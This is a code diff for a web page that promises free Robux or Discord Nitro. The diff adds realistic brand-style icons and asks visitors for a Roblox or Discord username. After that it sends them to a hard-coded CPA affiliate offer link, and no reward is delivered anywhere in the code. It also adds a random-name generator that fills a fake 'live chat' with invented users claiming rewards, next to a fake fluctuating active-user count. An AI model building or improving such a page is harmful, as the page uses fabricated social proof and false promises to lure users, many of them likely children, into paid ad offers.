@@ -23,7 +23,6 @@ body{
              radial-gradient(ellipse at 60% 80%, rgba(160,30,30,0.6) 0%, transparent 50%),
              #1a0000;
   z-index:0;
-  filter:blur(0px);
 }
 .bg-boxes{
   position:fixed;inset:0;z-index:1;
@@ -51,53 +50,12 @@ body{
   padding:8px 14px;font-size:14px;font-weight:500;color:#222;
   cursor:pointer;box-shadow:0 2px 8px rgba(0,0,0,0.15);
 }
-.lang-sel img{width:20px;height:14px;border-radius:2px}
-
-/* ROBLOX CHARACTER */
-.roblox-char{
-  position:fixed;top:0;left:50%;transform:translateX(-50%);
-  z-index:10;pointer-events:none;
-  width:120px;height:180px;
-  display:flex;align-items:flex-start;justify-content:center;
-}
-.char-img{
-  width:110px;height:170px;
-  object-fit:contain;
-  filter:drop-shadow(0 4px 16px rgba(0,0,0,0.5));
-}
-/* Fallback character drawn in CSS */
-.char-fallback{
-  width:80px;height:150px;position:relative;margin-top:10px;
-}
-.char-head{
-  width:44px;height:40px;background:#ffcc99;border-radius:4px;
-  margin:0 auto;position:relative;border:2px solid #e6b07a;
-}
-.char-head::after{
-  content:'😊';position:absolute;top:50%;left:50%;
-  transform:translate(-50%,-50%);font-size:20px;
-}
-.char-hat{
-  width:50px;height:22px;background:#f5c518;border-radius:4px 4px 0 0;
-  margin:0 auto;position:relative;top:2px;
-  border:2px solid #d4a017;
-}
-.char-hat::before{
-  content:'$';position:absolute;top:2px;left:50%;transform:translateX(-50%);
-  font-size:14px;font-weight:800;color:#fff;
-}
-.char-body{
-  width:48px;height:55px;background:#2d6a2d;border-radius:4px;
-  margin:0 auto;border:2px solid #1e4e1e;
-}
-.char-legs{display:flex;justify-content:center;gap:4px;margin-top:2px}
-.char-leg{width:18px;height:40px;background:#1a3a8f;border-radius:0 0 4px 4px;border:2px solid #122b6e}
 
 /* MAIN LAYOUT */
 .main{
   position:relative;z-index:5;
   display:flex;align-items:flex-start;justify-content:center;
-  gap:20px;padding:130px 20px 40px;
+  gap:20px;padding:60px 20px 40px;
   min-height:100vh;
 }
 
@@ -142,24 +100,9 @@ body{
 
 /* CENTER PANEL */
 .center-panel{width:400px;background:rgba(255,255,255,0.97)}
-.panel-avatar{
-  display:flex;justify-content:center;
-  position:relative;top:-36px;margin-bottom:-28px;
-}
-.avatar-ring{
-  width:64px;height:64px;border-radius:50%;
-  background:linear-gradient(135deg,#ff6b6b,#a855f7,#3b82f6);
-  padding:3px;
-  box-shadow:0 2px 12px rgba(0,0,0,0.2);
-}
-.avatar-inner{
-  width:100%;height:100%;border-radius:50%;
-  background:#fff;display:flex;align-items:center;justify-content:center;
-  font-size:28px;
-}
 
 /* REWARD SCREEN */
-.reward-screen{padding:24px 28px 32px;text-align:center;display:none}
+.reward-screen{padding:28px 28px 32px;text-align:center;display:none}
 .reward-screen.active{display:block}
 .reward-screen h2{font-size:24px;font-weight:800;color:#111;margin-bottom:8px;letter-spacing:-0.5px}
 .reward-screen .subtitle{font-size:14px;color:#666;margin-bottom:28px}
@@ -171,25 +114,18 @@ body{
 }
 .reward-card:hover{border-color:#22c55e;transform:translateY(-2px);box-shadow:0 6px 20px rgba(0,0,0,0.1)}
 .reward-card.selected{border-color:#22c55e;background:#f0fdf4}
-.reward-icon{font-size:48px;margin-bottom:12px;display:block}
 .reward-card h3{font-size:16px;font-weight:700;color:#111;margin-bottom:4px}
 .reward-card p{font-size:12px;color:#888;line-height:1.4}
-/* Robux gold icon */
 .robux-icon{
-  width:60px;height:60px;background:linear-gradient(135deg,#c8940a,#f5c518);
-  border-radius:50%;display:flex;align-items:center;justify-content:center;
-  margin:0 auto 12px;box-shadow:0 2px 8px rgba(200,148,10,0.4);
-  border:3px solid #d4a017;
+  width:68px;height:68px;
+  margin:0 auto 12px;
+  display:flex;align-items:center;justify-content:center;
 }
-.robux-icon svg{width:30px;height:30px;fill:#fff}
-/* Nitro icon */
 .nitro-icon{
-  width:60px;height:60px;background:linear-gradient(135deg,#5865f2,#9b59b6);
-  border-radius:12px;display:flex;align-items:center;justify-content:center;
-  margin:0 auto 12px;box-shadow:0 2px 8px rgba(88,101,242,0.4);
-  border:3px solid #4752c4;
+  width:68px;height:68px;
+  margin:0 auto 12px;
+  display:flex;align-items:center;justify-content:center;
 }
-.nitro-icon svg{width:30px;height:30px;fill:#fff}
 
 /* QUEST SCREEN */
 .quest-screen{padding:24px 28px 28px;text-align:center;display:none}
@@ -206,10 +142,7 @@ body{
   text-decoration:none;position:relative;
 }
 .quest-btn:hover{background:#16a34a}
-.quest-btn.loading{
-  background:#16a34a;
-  padding-right:40px;
-}
+.quest-btn.loading{background:#16a34a;padding-right:40px;}
 .quest-btn .spinner{
   position:absolute;right:14px;top:50%;transform:translateY(-50%);
   width:18px;height:18px;border:2px solid rgba(255,255,255,0.3);
@@ -218,9 +151,7 @@ body{
 }
 .quest-btn.loading .spinner{display:block}
 @keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
-.progress-bar-wrap{
-  margin:4px 0 2px;height:4px;background:#e5e5e5;border-radius:2px;overflow:hidden;
-}
+.progress-bar-wrap{margin:4px 0 2px;height:4px;background:#e5e5e5;border-radius:2px;overflow:hidden;}
 .progress-bar-fill{height:100%;background:#22c55e;border-radius:2px}
 .progress-label{font-size:11px;color:#aaa;text-align:left;margin-bottom:8px}
 
@@ -256,8 +187,7 @@ body{
 }
 .active-dot::before{
   content:'';width:7px;height:7px;background:#22c55e;
-  border-radius:50%;display:block;
-  box-shadow:0 0 6px #22c55e;
+  border-radius:50%;display:block;box-shadow:0 0 6px #22c55e;
 }
 .chat-messages{
   height:340px;overflow-y:auto;padding:12px 16px;
@@ -267,11 +197,10 @@ body{
 .chat-messages::-webkit-scrollbar{width:4px}
 .chat-messages::-webkit-scrollbar-thumb{background:#ddd;border-radius:2px}
 .chat-msg{font-size:13px;color:#444;line-height:1.5}
-.chat-msg .username{font-weight:700;color:#00b894;cursor:pointer}
-.chat-msg .username:hover{text-decoration:underline}
+.chat-msg .username{font-weight:700;color:#00b894}
 .chat-msg .action{color:#666}
-.chat-msg .reward-type{font-weight:700;color:#ff6b35}
-.chat-msg .reward-robux{font-weight:700;color:#f5c518}
+.chat-msg .reward-type{font-weight:700;color:#5865f2}
+.chat-msg .reward-robux{font-weight:700;color:#c8940a}
 .chat-input-wrap{
   display:flex;align-items:center;gap:8px;
   padding:12px 16px;border-top:1px solid #f0f0f0;
@@ -285,57 +214,45 @@ body{
 /* USERNAME MODAL */
 .modal-overlay{
   position:fixed;inset:0;z-index:200;
-  background:rgba(0,0,0,0.5);backdrop-filter:blur(4px);
-  display:flex;align-items:center;justify-content:center;
+  background:rgba(0,0,0,0.55);backdrop-filter:blur(4px);
+  align-items:center;justify-content:center;
   display:none;
 }
 .modal-overlay.active{display:flex}
 .modal{
-  background:#fff;border-radius:16px;padding:32px;width:360px;
+  background:#fff;border-radius:16px;padding:32px;width:380px;
   box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center;
 }
 .modal h3{font-size:20px;font-weight:800;color:#111;margin-bottom:8px}
-.modal p{font-size:14px;color:#666;margin-bottom:24px;line-height:1.6}
+.modal p{font-size:14px;color:#666;margin-bottom:20px;line-height:1.6}
+.modal-input-wrap{position:relative;margin-bottom:8px}
 .modal input{
-  width:100%;padding:12px 16px;border:2px solid #e5e5e5;border-radius:8px;
-  font-size:15px;font-family:'Inter',sans-serif;outline:none;margin-bottom:16px;
+  width:100%;padding:13px 16px;border:2px solid #e5e5e5;border-radius:8px;
+  font-size:15px;font-family:'Inter',sans-serif;outline:none;
   transition:border-color .2s;
 }
 .modal input:focus{border-color:#22c55e}
+.modal input.has-min{border-color:#22c55e}
+.input-hint{font-size:12px;color:#aaa;margin-bottom:16px;text-align:left}
+.input-hint.valid{color:#22c55e}
+/* Continue button - disabled by default */
 .modal-btn{
-  width:100%;padding:13px;background:#22c55e;color:#fff;
+  width:100%;padding:13px;background:#d1d5db;color:#9ca3af;
   border:none;border-radius:8px;font-size:15px;font-weight:700;
-  font-family:'Inter',sans-serif;cursor:pointer;transition:background .15s;
+  font-family:'Inter',sans-serif;cursor:not-allowed;transition:all .2s;
+  opacity:0.7;
 }
-.modal-btn:hover{background:#16a34a}
-.modal-skip{
-  display:block;margin-top:12px;font-size:13px;color:#aaa;
-  cursor:pointer;text-decoration:underline;
+.modal-btn.enabled{
+  background:#22c55e;color:#fff;cursor:pointer;opacity:1;
 }
-.modal-skip:hover{color:#888}
+.modal-btn.enabled:hover{background:#16a34a}
 </style>
 </head>
 <body>
 
-<!-- BACKGROUND -->
 <div class="bg"></div>
 <div class="bg-boxes"></div>
-
-<!-- SNOWFLAKES -->
 <div class="snow-container" id="snow"></div>
-
-<!-- ROBLOX CHARACTER -->
-<div class="roblox-char">
-  <div class="char-fallback">
-    <div class="char-hat"></div>
-    <div class="char-head"></div>
-    <div class="char-body"></div>
-    <div class="char-legs">
-      <div class="char-leg"></div>
-      <div class="char-leg"></div>
-    </div>
-  </div>
-</div>
 
 <!-- MAIN LAYOUT -->
 <div class="main">
@@ -349,60 +266,34 @@ body{
         <p>Have questions or issues?</p>
       </div>
     </div>
-
     <div class="faq-item" onclick="toggleFaq(this)">
-      <div class="faq-q">
-        How do I use this?
-        <span class="faq-chevron">▾</span>
-      </div>
+      <div class="faq-q">How do I use this?<span class="faq-chevron open">▾</span></div>
       <div class="faq-a open">Select a reward. For Roblox rewards, enter your Roblox username. For Nitro rewards, no username is needed. Then complete one quest.</div>
     </div>
     <div class="faq-item" onclick="toggleFaq(this)">
-      <div class="faq-q">
-        How do I receive my prize?
-        <span class="faq-chevron">▾</span>
-      </div>
-      <div class="faq-a">After completing a quest, your reward is sent automatically. Robux appears in your account within minutes. Nitro is delivered via email.</div>
+      <div class="faq-q">How do I receive my prize?<span class="faq-chevron">▾</span></div>
+      <div class="faq-a">After completing a quest, your reward is sent automatically. Robux appears in your account within minutes. Nitro is delivered via email or Discord.</div>
     </div>
     <div class="faq-item" onclick="toggleFaq(this)">
-      <div class="faq-q">
-        What if I can't complete a quest?
-        <span class="faq-chevron">▾</span>
-      </div>
+      <div class="faq-q">What if I can't complete a quest?<span class="faq-chevron">▾</span></div>
       <div class="faq-a">Just try another one! There are multiple quests available. If one doesn't work for you, another will. Contact support if you have ongoing issues.</div>
     </div>
     <div class="faq-item" onclick="toggleFaq(this)">
-      <div class="faq-q">
-        Why do I have to do a quest?
-        <span class="faq-chevron">▾</span>
-      </div>
+      <div class="faq-q">Why do I have to do a quest?<span class="faq-chevron">▾</span></div>
       <div class="faq-a">Completing quests is how we fund the rewards. Our partners pay us when you complete tasks, and we share that with you as Robux or Nitro.</div>
     </div>
     <div class="faq-item" onclick="toggleFaq(this)">
-      <div class="faq-q">
-        Can I claim more than once?
-        <span class="faq-chevron">▾</span>
-      </div>
-      <div class="faq-a">Each account can claim once every 24 hours. Complete more quests to increase your daily limit. Premium accounts get higher limits.</div>
+      <div class="faq-q">Can I claim more than once?<span class="faq-chevron">▾</span></div>
+      <div class="faq-a">Each account can claim once every 24 hours. Complete more quests to increase your daily limit.</div>
     </div>
     <div class="faq-item" onclick="toggleFaq(this)">
-      <div class="faq-q">
-        Is this an official Roblox website?
-        <span class="faq-chevron">▾</span>
-      </div>
+      <div class="faq-q">Is this an official Roblox website?<span class="faq-chevron">▾</span></div>
       <div class="faq-a">No. This site is not affiliated with or endorsed by Roblox Corporation. We are an independent rewards platform.</div>
     </div>
   </div>
 
   <!-- CENTER PANEL -->
   <div class="panel center-panel" id="centerPanel">
-
-    <!-- AVATAR -->
-    <div class="panel-avatar">
-      <div class="avatar-ring">
-        <div class="avatar-inner">😊</div>
-      </div>
-    </div>
 
     <!-- REWARD SELECTION SCREEN -->
     <div class="reward-screen active" id="rewardScreen">
@@ -411,14 +302,97 @@ body{
       <div class="reward-cards">
         <div class="reward-card" id="robuxCard" onclick="selectReward('robux')">
           <div class="robux-icon">
-            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-11h2v2h-2zm0 4h2v4h-2z"/></svg>
+            <!-- Realistic Roblox R$ icon -->
+            <svg width="72" height="72" viewBox="0 0 72 72" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <defs>
+                <linearGradient id="rbox" x1="0" y1="0" x2="72" y2="72" gradientUnits="userSpaceOnUse">
+                  <stop offset="0%" stop-color="#f0f0f0"/>
+                  <stop offset="100%" stop-color="#e0e0e0"/>
+                </linearGradient>
+                <linearGradient id="rhex_outer" x1="36" y1="4" x2="36" y2="68" gradientUnits="userSpaceOnUse">
+                  <stop offset="0%" stop-color="#e8c84a"/>
+                  <stop offset="40%" stop-color="#c8920a"/>
+                  <stop offset="100%" stop-color="#8a6005"/>
+                </linearGradient>
+                <linearGradient id="rhex_inner" x1="36" y1="12" x2="36" y2="60" gradientUnits="userSpaceOnUse">
+                  <stop offset="0%" stop-color="#f5d060"/>
+                  <stop offset="50%" stop-color="#d4a020"/>
+                  <stop offset="100%" stop-color="#a07010"/>
+                </linearGradient>
+                <linearGradient id="rsquare" x1="22" y1="22" x2="50" y2="50" gradientUnits="userSpaceOnUse">
+                  <stop offset="0%" stop-color="#fff8e8"/>
+                  <stop offset="100%" stop-color="#f0d080"/>
+                </linearGradient>
+                <filter id="rshadow" x="-10%" y="-10%" width="120%" height="130%">
+                  <feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#00000033"/>
+                </filter>
+              </defs>
+              <!-- App icon background -->
+              <rect width="72" height="72" rx="16" fill="url(#rbox)"/>
+              <!-- Outer hex with shadow -->
+              <g filter="url(#rshadow)">
+                <polygon points="36,5 62,20 62,52 36,67 10,52 10,20" fill="url(#rhex_outer)"/>
+              </g>
+              <!-- Inner hex highlight ring -->
+              <polygon points="36,9 58,22 58,50 36,63 14,50 14,22" fill="url(#rhex_inner)"/>
+              <!-- White square (rotated 45deg cut shape) -->
+              <rect x="23" y="23" width="26" height="26" rx="3" fill="url(#rsquare)" transform="rotate(0 36 36)"/>
+              <!-- Center cutout square (same color as inner hex) -->
+              <rect x="28.5" y="28.5" width="15" height="15" rx="2" fill="url(#rhex_inner)"/>
+              <!-- Highlight gloss top-left -->
+              <polygon points="36,9 58,22 52,18 36,11 20,18 14,22" fill="white" opacity="0.18"/>
+            </svg>
           </div>
           <h3>800 Robux</h3>
           <p>Get 800 Robux instantly</p>
         </div>
         <div class="reward-card" id="nitroCard" onclick="selectReward('nitro')">
           <div class="nitro-icon">
-            <svg viewBox="0 0 24 24"><path d="M13 3L4 14h7l-2 7 9-11h-7l2-7z"/></svg>
+            <!-- Realistic Discord Nitro icon -->
+            <svg width="72" height="72" viewBox="0 0 72 72" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <defs>
+                <linearGradient id="nitro_bg" x1="0" y1="0" x2="72" y2="72" gradientUnits="userSpaceOnUse">
+                  <stop offset="0%" stop-color="#7289da"/>
+                  <stop offset="100%" stop-color="#4752c4"/>
+                </linearGradient>
+                <linearGradient id="nitro_bolt" x1="32" y1="8" x2="40" y2="64" gradientUnits="userSpaceOnUse">
+                  <stop offset="0%" stop-color="#ffffff"/>
+                  <stop offset="100%" stop-color="#c8d0ff"/>
+                </linearGradient>
+                <linearGradient id="nitro_glow" x1="20" y1="20" x2="52" y2="52" gradientUnits="userSpaceOnUse">
+                  <stop offset="0%" stop-color="#9b8dff" stop-opacity="0.5"/>
+                  <stop offset="100%" stop-color="#5865f2" stop-opacity="0"/>
+                </linearGradient>
+                <filter id="nshadow">
+                  <feDropShadow dx="0" dy="2" stdDeviation="2" flood-color="#00000044"/>
+                </filter>
+                <filter id="nglow">
+                  <feGaussianBlur stdDeviation="3" result="blur"/>
+                  <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
+                </filter>
+              </defs>
+              <!-- Background -->
+              <rect width="72" height="72" rx="16" fill="url(#nitro_bg)"/>
+              <!-- Subtle radial glow center -->
+              <circle cx="36" cy="36" r="28" fill="url(#nitro_glow)"/>
+              <!-- Outer ring circle -->
+              <circle cx="36" cy="36" r="24" fill="none" stroke="white" stroke-width="2.5" stroke-opacity="0.25"/>
+              <!-- Inner ring circle -->
+              <circle cx="36" cy="36" r="17" fill="none" stroke="white" stroke-width="2" stroke-opacity="0.15"/>
+              <!-- Lightning bolt - main -->
+              <g filter="url(nglow)">
+                <path d="M40 10 L24 38 H34.5 L32 62 L50 34 H39 L40 10Z" fill="url(#nitro_bolt)" filter="url(#nshadow)"/>
+              </g>
+              <!-- Bolt highlight edge -->
+              <path d="M40 10 L38 10 L23 38 H33 L30.5 62 L32 62 L50 34 H39 L40 10Z" fill="white" opacity="0.12"/>
+              <!-- Stars/sparkles -->
+              <circle cx="16" cy="18" r="2" fill="white" opacity="0.5"/>
+              <circle cx="56" cy="16" r="1.5" fill="white" opacity="0.4"/>
+              <circle cx="58" cy="54" r="1.5" fill="white" opacity="0.35"/>
+              <circle cx="14" cy="52" r="2" fill="white" opacity="0.4"/>
+              <!-- Gloss top -->
+              <rect x="0" y="0" width="72" height="22" rx="16" fill="white" opacity="0.06"/>
+            </svg>
           </div>
           <h3>Nitro</h3>
           <p>1 month of Discord Nitro</p>
@@ -426,40 +400,8 @@ body{
       </div>
     </div>
 
-    <!-- QUEST SCREEN -->
-    <div class="quest-screen" id="questScreen">
-      <h2>Complete One Quest</h2>
-      <p class="subtitle">Choose and complete just 1 quest below to receive <b id="selectedRewardLabel">Robux</b> — If one doesn't work, try another!</p>
-
-      <button class="quest-btn" onclick="clickQuest(this)">
-        Click to get your bonus!
-        <span class="spinner"></span>
-      </button>
-      <button class="quest-btn" onclick="clickQuest(this)">
-        Odulunuzu talep etmek icin dokunun
-        <span class="spinner"></span>
-      </button>
-      <button class="quest-btn" onclick="clickQuest(this)">
-        Odulunuzu almak icin tiklayin!
-        <span class="spinner"></span>
-      </button>
-      <button class="quest-btn" onclick="clickQuest(this)">
-        Score more than 2 goals to unlock a special offer!
-        <span class="spinner"></span>
-      </button>
-      <div style="position:relative">
-        <button class="quest-btn loading" onclick="clickQuest(this)">
-          Pick the winning team and unlock a special offer!
-          <span class="spinner" style="display:block"></span>
-        </button>
-        <div class="progress-bar-wrap"><div class="progress-bar-fill" style="width:80%"></div></div>
-        <div class="progress-label">80%</div>
-      </div>
-    </div>
-
     <div class="panel-bottom">
-      <button class="panel-btn-icon" title="Refresh" onclick="goBack()">↩</button>
-      <button class="panel-btn-icon" title="Refresh quests" onclick="refreshQuests()">🔄</button>
+      <button class="panel-btn-icon" title="Go back" onclick="goBack()">↩</button>
     </div>
   </div>
 
@@ -494,28 +436,26 @@ body{
 <!-- USERNAME MODAL -->
 <div class="modal-overlay" id="usernameModal">
   <div class="modal">
-    <h3>Enter Your Roblox Username</h3>
-    <p>We'll send your <strong>800 Robux</strong> directly to your Roblox account after you complete a quest.</p>
-    <input type="text" id="usernameInput" placeholder="Your Roblox username" maxlength="20">
-    <button class="modal-btn" onclick="confirmUsername()">Continue →</button>
-    <span class="modal-skip" onclick="skipUsername()">Skip for now</span>
+    <h3 id="modalTitle">Enter Your Roblox Username</h3>
+    <p id="modalDesc">We'll send your <strong>800 Robux</strong> directly to your Roblox account after you complete a quest.</p>
+    <div class="modal-input-wrap">
+      <input type="text" id="usernameInput" placeholder="Your Roblox username" maxlength="20" oninput="checkUsername(this)">
+    </div>
+    <div class="input-hint" id="inputHint">At least 3 characters required</div>
+    <button class="modal-btn" id="continueBtn" onclick="confirmUsername()">Continue →</button>
   </div>
 </div>
 
 <script>
+const CPA_LINK = 'https://appsave.online/cl/i/1x3g7k';
+
 // === SNOWFLAKES ===
 const snowContainer = document.getElementById('snow');
 for(let i=0;i<30;i++){
   const flake = document.createElement('div');
   flake.className = 'snowflake';
   flake.textContent = '*';
-  flake.style.cssText = `
-    left:${Math.random()*100}%;
-    font-size:${8+Math.random()*10}px;
-    animation-duration:${5+Math.random()*10}s;
-    animation-delay:${Math.random()*10}s;
-    opacity:${0.4+Math.random()*0.5};
-  `;
+  flake.style.cssText = `left:${Math.random()*100}%;font-size:${8+Math.random()*10}px;animation-duration:${5+Math.random()*10}s;animation-delay:${Math.random()*10}s;opacity:${0.4+Math.random()*0.5};`;
   snowContainer.appendChild(flake);
 }
 
@@ -526,9 +466,24 @@ function toggleFaq(el){
   const isOpen = answer.classList.contains('open');
   document.querySelectorAll('.faq-a').forEach(a=>a.classList.remove('open'));
   document.querySelectorAll('.faq-chevron').forEach(c=>c.classList.remove('open'));
-  if(!isOpen){
-    answer.classList.add('open');
-    chevron.classList.add('open');
+  if(!isOpen){answer.classList.add('open');chevron.classList.add('open');}
+}
+
+// === USERNAME INPUT CHECK ===
+function checkUsername(input){
+  const val = input.value.trim();
+  const btn = document.getElementById('continueBtn');
+  const hint = document.getElementById('inputHint');
+  if(val.length >= 3){
+    btn.classList.add('enabled');
+    hint.textContent = '✓ Looks good!';
+    hint.classList.add('valid');
+    input.classList.add('has-min');
+  } else {
+    btn.classList.remove('enabled');
+    hint.textContent = 'At least 3 characters required';
+    hint.classList.remove('valid');
+    input.classList.remove('has-min');
   }
 }
 
@@ -540,70 +495,56 @@ function selectReward(type){
   document.querySelectorAll('.reward-card').forEach(c=>c.classList.remove('selected'));
   document.getElementById(type==='robux'?'robuxCard':'nitroCard').classList.add('selected');
 
+  // Reset modal input
+  document.getElementById('usernameInput').value = '';
+  document.getElementById('continueBtn').classList.remove('enabled');
+  document.getElementById('inputHint').textContent = 'At least 3 characters required';
+  document.getElementById('inputHint').classList.remove('valid');
+
+  if(type==='robux'){
+    document.getElementById('modalTitle').textContent = 'Enter Your Roblox Username';
+    document.getElementById('modalDesc').innerHTML = 'We\'ll send your <strong>800 Robux</strong> directly to your Roblox account after you complete a quest.';
+    document.getElementById('usernameInput').placeholder = 'Your Roblox username';
+  } else {
+    document.getElementById('modalTitle').textContent = 'Enter Your Discord Username';
+    document.getElementById('modalDesc').innerHTML = 'We\'ll send your <strong>Discord Nitro</strong> gift to your account after you complete a quest.';
+    document.getElementById('usernameInput').placeholder = 'Your Discord username';
+  }
+
   setTimeout(()=>{
-    if(type==='robux'){
-      document.getElementById('usernameModal').classList.add('active');
-    } else {
-      showQuestScreen();
-    }
-  }, 300);
+    document.getElementById('usernameModal').classList.add('active');
+  }, 250);
 }
 
 function confirmUsername(){
   const val = document.getElementById('usernameInput').value.trim();
+  if(val.length < 3) return;
   document.getElementById('usernameModal').classList.remove('active');
-  showQuestScreen();
-}
-
-function skipUsername(){
-  document.getElementById('usernameModal').classList.remove('active');
-  showQuestScreen();
-}
-
-function showQuestScreen(){
-  document.getElementById('rewardScreen').classList.remove('active');
-  document.getElementById('questScreen').classList.add('active');
-  const label = selectedReward==='robux'?'Robux':'Nitro';
-  document.getElementById('selectedRewardLabel').textContent = label;
-  document.querySelector('.panel-avatar').style.display='none';
+  window.open(CPA_LINK, '_blank');
 }
 
 function goBack(){
   document.getElementById('rewardScreen').classList.add('active');
-  document.getElementById('questScreen').classList.remove('active');
-  document.querySelector('.panel-avatar').style.display='flex';
 }
 
-function refreshQuests(){
-  const btns = document.querySelectorAll('.quest-btn');
-  btns.forEach(b=>{
-    b.style.opacity='0.5';
-    setTimeout(()=>b.style.opacity='1',600);
-  });
+// === LIVE CHAT — fully random name generator ===
+const prefixes = ['Blaze','Forge','Shadow','Neon','Viper','Ghost','Storm','Lunar','Pixel','Nova','Hyper','Turbo','Cosmic','Frost','Eagle','Tiger','Spark','Knight','Glitch','Swift','Rocket','Zero','Star','Void','Dark','Ultra','Mega','Iron','Cyber','Ninja'];
+const suffixes = ['Boy','Pro','YT','Grind','King','Lord','X','HD','99','21','8','3','_7','22','44','_RBX','2024','2025','Plays','Quest'];
+function randName(){
+  return prefixes[Math.floor(Math.random()*prefixes.length)] + suffixes[Math.floor(Math.random()*suffixes.length)];
 }
-
-function clickQuest(btn){
-  btn.classList.add('loading');
-  const sp = btn.querySelector('.spinner');
-  if(sp) sp.style.display='block';
-  // Simulate opening offer
-  setTimeout(()=>{
-    btn.classList.remove('loading');
-    if(sp) sp.style.display='none';
-  },3000);
+// keep last 6 to avoid immediate repeats
+const recentNames = [];
+function getUniqueName(){
+  let n;
+  let tries = 0;
+  do { n = randName(); tries++; } while(recentNames.includes(n) && tries < 20);
+  recentNames.push(n);
+  if(recentNames.length > 6) recentNames.shift();
+  return n;
 }
-
-// === LIVE CHAT ===
-const names = [
-  'ForgeBlaze8','Eagle_Tiger_3','MoonBlaze21','MoonNimbusHD2024','SparkLunar_9',
-  'FrostStormPlays99','Blaze_Echo21','ForgeSable8','PandaBlazeYT99','KnightBlaze8',
-  'BlazeEaglePro8','ViperStar11','GlitchNimbus8','SwiftQuest123','ProKnight21',
-  'Void_Retro9','PixelNovaYT2024','StarBlazer7','CosmicRex44','NeonFrost22',
-  'ShadowByte_X','TurboQuest5','LunarGrind99','ZeroGlitch8','RocketPanda3'
-];
 const rewards = ['Robux','Nitro','Robux','Robux','Nitro','Robux'];
 const actions = ['just claimed','just claimed','just earned'];
-
 function getRand(arr){return arr[Math.floor(Math.random()*arr.length)]}
 
 function addChatMessage(name, action, reward, msg){
@@ -618,33 +559,19 @@ function addChatMessage(name, action, reward, msg){
   const chat = document.getElementById('chatMessages');
   chat.appendChild(div);
   chat.scrollTop = chat.scrollHeight;
-  // Keep max 30 messages
   while(chat.children.length>30) chat.removeChild(chat.firstChild);
 }
 
-// Initial messages
-const initialMsgs = [
-  {n:'ForgeBlaze8',r:'Robux'},{n:'Eagle_Tiger_3',r:'Robux'},
-  {n:'MoonBlaze21',r:'Nitro'},{n:'MoonNimbusHD2024',r:'Robux'},
-  {n:'SparkLunar_9',r:'Nitro'},{n:'FrostStormPlays99',r:'Robux'},
-  {n:'Blaze_Echo21',r:'Robux'},{n:'ForgeSable8',r:'Robux'},
-  {n:'PandaBlazeYT99',r:'Nitro'},{n:'KnightBlaze8',r:'Robux'},
-  {n:'BlazeEaglePro8',r:'Nitro'},
-];
-initialMsgs.forEach(m=>addChatMessage(m.n,'just claimed',m.r));
+// seed initial messages with random names
+for(let i=0;i<11;i++){
+  addChatMessage(getUniqueName(),'just claimed',getRand(rewards));
+}
+setTimeout(()=>addChatMessage(getUniqueName(),null,null,'thanks'),500);
 
-// Add message from PixelNovaYT2024
-setTimeout(()=>addChatMessage('PixelNovaYT2024',null,null,'thanks'),500);
-
-// Auto messages
 setInterval(()=>{
-  const name = getRand(names);
-  const reward = getRand(rewards);
-  const action = getRand(actions);
-  addChatMessage(name,action,reward);
+  addChatMessage(getUniqueName(), getRand(actions), getRand(rewards));
 }, 2200+Math.random()*2000);
 
-// Active count fluctuation
 let activeCount = 180;
 setInterval(()=>{
   activeCount += Math.floor(Math.random()*7)-3;
